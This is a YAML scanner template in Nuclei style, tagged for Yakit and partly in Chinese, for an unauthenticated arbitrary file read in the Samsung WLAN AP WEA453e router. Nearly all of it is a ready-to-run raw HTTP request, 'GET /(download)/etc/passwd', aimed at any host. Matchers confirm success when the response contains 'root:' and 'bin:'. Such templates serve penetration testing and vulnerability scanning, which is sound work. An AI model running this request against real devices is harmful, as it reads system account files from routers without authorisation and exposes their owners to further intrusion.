content:
id: 三星路由器WLAN AP任意文件读取

info:
  name: 三星路由器WLAN AP任意文件读取
  author: Deans
  severity: high
  description: 三星 WLAN AP WEA453e路由器存在任意文件读取漏洞，可在未授权的情况下获取敏感信息。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: cb41417b6cf9b3452b371c7429a57ecf

http:
- raw:
  - |+
    @timeout: 30s
    GET /(download)/etc/passwd HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'root:'
    - 'bin:'
    condition: and
